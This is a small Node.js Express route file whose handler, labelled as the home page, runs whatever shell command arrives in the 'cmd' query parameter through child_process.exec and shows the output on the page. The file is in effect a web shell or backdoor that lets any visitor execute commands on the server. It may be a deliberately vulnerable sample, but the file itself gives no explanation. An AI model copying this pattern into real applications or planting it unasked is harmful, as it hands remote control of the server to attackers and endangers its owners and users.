var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  var cmd = req.query.cmd;
  var exec = require('child_process').exec;
  var output = '';

  var child = exec(cmd, function(err, stdout, stderr) {
      output = stdout;
      res.render('index', { 'title': 'Express', result: output});
  });
});

module.exports = router;
